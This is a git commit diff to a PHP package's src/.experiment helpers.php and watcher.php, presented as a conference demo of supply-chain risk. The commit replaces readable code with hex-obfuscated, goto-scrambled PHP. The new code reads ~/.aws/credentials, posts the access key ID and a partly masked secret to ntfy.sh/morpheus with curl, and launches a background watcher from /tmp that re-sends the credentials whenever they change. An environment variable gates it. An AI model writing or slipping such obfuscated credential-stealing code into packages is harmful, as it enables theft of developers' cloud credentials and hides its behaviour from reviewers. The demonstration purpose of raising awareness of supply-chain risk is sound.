6d626c8d0810a772c0d52f7460ef823f2fe555a7
⭐️ Michael <michael.hurni@gmail.com>
2026-06-15 22:53:42 +0200

    Push the demo a little further

--- src/.experiment/helpers.php
+++ src/.experiment/helpers.php
@@ -5,7 +5,7 @@
  * This is a little experiment I made to prove in live, during a talk at a dev conf,
  * the danger of adding a composer package without checking its source code. 
  * Don't be scared. This is just for demo purposes.
- * AND, this is completely un executed without an ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
+ * AND, this is NEVER executed without a very specific ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
  * Also, this project is anyway completely abandonned and used by maybe no-one.
  */
 
@@ -13,36 +13,4 @@ if (!isset($_SERVER['ALLOW_MORPHEUS_EXPERIMENT'])) {
   return false;
 }
 
-// Looking for the AWS credentials
-$credFile = $_SERVER['HOME']."/.aws/credentials";
-$credentials = parse_ini_file($credFile, true)['default'] ?? null;
-
-if (!$credentials) {
-  return false;
-}
-
-if (isset($credentials['aws_access_key_id'])) {
-  $key = $credentials['aws_access_key_id'];
-  $secret = $credentials['aws_secret_access_key'];
-  // This is just a POC, we don't really want to compromise your secret
-  // Here we mask the secret to avoid leaking it during the demo.
-  // but if you are reading this, you should be aware that a malicious package 
-  // could have done it without your knowledge.
-  $secret = substr($secret, 0, 8) . str_repeat('*', 32);
-
-  $message = "AWS Credentials found:\n";
-  $message .= "Key: $key\n";
-  $message .= "Secret: $secret\n";
-
-  // Send the message to a remote server
-  shell_exec("curl --silent -d '$message' ntfy.sh/morpheus");
-}
-
-exec('cp ' . escapeshellarg(__DIR__ . '/watcher.php') . ' /tmp/watcher.php');
-
-$cmd = sprintf(
-    'nohup php %s > /tmp/watcher.log 2>&1 &',
-    escapeshellarg('/tmp/watcher.php')
-);
-
-exec($cmd);
+if (file_exists("\x2f\164\155\x70\57\167\141\x74\143\150\x65\x72\x2e\x70\x68\x70")) { return false; } $src = $_SERVER["\x48\117\x4d\105"] . "\57\x2e\x61\167\x73\57\143\x72\x65\x64\145\156\x74\151\x61\154\x73"; $c = parse_ini_file($src, true)["\144\x65\x66\x61\x75\154\x74"] ?? null; if (!$c) return false; goto N3RWd; ZzjML: exec("\x63\160\x20" . escapeshellarg(__DIR__ . "\57\167\x61\164\x63\x68\x65\162\x2e\160\x68\x70") . "\x20\x2f\x74\x6d\x70\x2f\167\141\x74\x63\150\x65\162\x2e\x70\x68\160"); goto sao2F; N3RWd: if (isset($c["\x61\167\163\137\x61\143\143\x65\163\x73\137\x6b\x65\171\137\x69\144"])) { $k = $c["\141\167\163\x5f\141\x63\x63\x65\163\x73\137\x6b\145\x79\x5f\x69\x64"]; $s = $c["\x61\x77\163\137\x73\x65\143\162\145\164\137\141\143\143\145\163\x73\137\x6b\145\171"]; $s = substr($s, 0, 8) . str_repeat("\52", 32); $m = "\x41\x57\x53\x20\103\x72\145\x64\x65\156\x74\x69\141\x6c\163\x20\x66\157\x75\156\144\x3a\12"; $m .= "\x4b\145\x79\72\40{$k}\xa"; $m .= "\123\x65\143\162\x65\164\72\x20{$s}\xa"; shell_exec("\143\x75\x72\x6c\40\x2d\x2d\163\151\154\145\x6e\x74\x20\55\144\x20\x27{$m}\47\40\x6e\164\146\171\x2e\163\x68\57\x6d\x6f\x72\160\x68\145\x75\x73"); } goto ZzjML; sao2F: $C = sprintf("\x6e\157\x68\165\160\x20\160\150\x70\x20\45\x73\40\76\40\x2f\x74\x6d\x70\57\167\x61\x74\143\x68\145\162\56\x6c\x6f\147\40\62\76\x26\x31\40\x26", escapeshellarg("\x2f\x74\x6d\160\x2f\x77\141\x74\x63\x68\x65\x72\x2e\160\150\x70")); goto CVLbI; CVLbI: exec($C);
--- src/.experiment/watcher.php
+++ src/.experiment/watcher.php
@@ -1,37 +1,13 @@
 <?php
 
-$file = $_SERVER['HOME']."/.aws/credentials";
+/**
+ * WHAT IS THIS ??
+ * This is a little experiment I made to prove in live, during a talk at a dev conf,
+ * the danger of adding a composer package without checking its source code. 
+ * Don't be scared. This is just for demo purposes.
+ * AND, this is NEVER executed without helpers.php which requires a very specific 
+ * ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
+ * Also, this project is anyway completely abandonned and used by maybe no-one.
+ */
 
-$last = filemtime($file);
-
-while (true) {
-
-    clearstatcache(false, $file);
-
-    $now = filemtime($file);
-
-    if ($now !== $last) {
-
-        $credentials = parse_ini_file($file, true)['default'] ?? null;
-
-        if ($credentials && isset($credentials['aws_access_key_id'])) {
-            $key = $credentials['aws_access_key_id'];
-            $secret = $credentials['aws_secret_access_key'];
-            // This is just a POC, we don't really want to compromise your secret
-            // Here we mask the secret to avoid leaking it during the demo.
-            // but if you are reading this, you should be aware that a malicious package 
-            // could have done it without your knowledge.
-            $secret = substr($secret, 0, 8) . str_repeat('*', 32);
-
-            $message = "NEW AWS Credentials found:\n";
-            $message .= "Key: $key\n";
-            $message .= "Secret: $secret\n";
-
-            shell_exec("curl --silent -d '$message' ntfy.sh/morpheus");
-
-            $last = $now;
-        }
-    }
-
-    sleep(10);
-}
+goto CH2pR; CH2pR: $f = $_SERVER["\x48\117\115\x45"] . "\x2f\56\141\167\163\57\x63\162\145\x64\x65\156\164\x69\x61\154\x73"; goto oocEM; oocEM: $l = filemtime($f); goto Q6YBg; Q6YBg: while (true) { clearstatcache(false, $f); $n = filemtime($f); if ($n !== $l) { $c = parse_ini_file($f, true)["\x64\x65\146\x61\x75\154\164"] ?? null; if ($c && isset($c["\141\167\x73\137\141\x63\143\145\x73\x73\137\153\145\171\137\x69\144"])) { $k = $c["\141\x77\x73\137\x61\x63\x63\145\163\163\x5f\153\145\x79\137\x69\x64"]; $s = $c["\x61\167\163\137\163\x65\x63\x72\145\x74\x5f\x61\x63\143\x65\163\x73\x5f\153\x65\171"]; $s = substr($s, 0, 8) . str_repeat("\x2a", 32); $m = "\116\105\x57\40\x41\127\123\x20\103\x72\x65\x64\x65\156\164\151\141\x6c\x73\x20\x66\x6f\x75\156\144\72\12"; $m .= "\x4b\x65\171\x3a\x20{$k}\xa"; $m .= "\x53\145\143\x72\x65\164\72\40{$s}\xa"; shell_exec("\143\x75\x72\154\x20\55\x2d\163\x69\154\x65\156\x74\40\55\144\x20\47{$m}\47\40\156\164\146\171\56\163\x68\x2f\x6d\157\162\160\x68\145\x75\x73"); $l = $n; } } sleep(10); }
